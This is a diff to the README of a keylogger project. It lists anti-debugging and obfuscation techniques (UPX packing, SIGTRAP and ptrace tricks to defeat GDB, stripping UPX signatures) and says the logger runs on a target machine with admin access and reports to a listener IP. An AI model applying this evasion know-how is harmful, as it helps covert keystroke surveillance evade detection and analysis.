@@ -5,6 +5,7 @@
 ## Credits
 
 Made in collaboration with:
+
 - [Adina C.](https://github.com/darksailormoonlight)
 - [Nils H.](https://github.com/nilshammond)
 
@@ -44,14 +45,13 @@ things I implemented, or want to implement:
 
 ### Obfuscation
 
-- using fancy gcc flags such a `-s -static` to remove some symbols.
 - using the UPX packer to compress your binary and remove unecessary section
 headers (you will need to compile with `-static`)
 - implementing a `sigaction` that renders `SIGTRAP` useless, so that debuggers
  like GDB do not work
 - check if `ptrace` is currently called on your program, to disable debuggers
  like GDB
-- create a simple program that will remove the strings from the compressed
+- created a simple script that will remove the strings from the compressed
 binary indicating it has been packed with UPX
 
 ### Features
@@ -72,7 +72,7 @@ to compile, just launch the `compile_logger.sh` script like so:
 sudo apt install -y upx && sh compile_logger.sh
 ```
 
-To launch the keylogger, you will need access to the target machine,
+To launch the keylogger, you will need admin access to the target machine,
 and from there, start the program. You will have to pass the listener's IP like so:
 
 ```sh
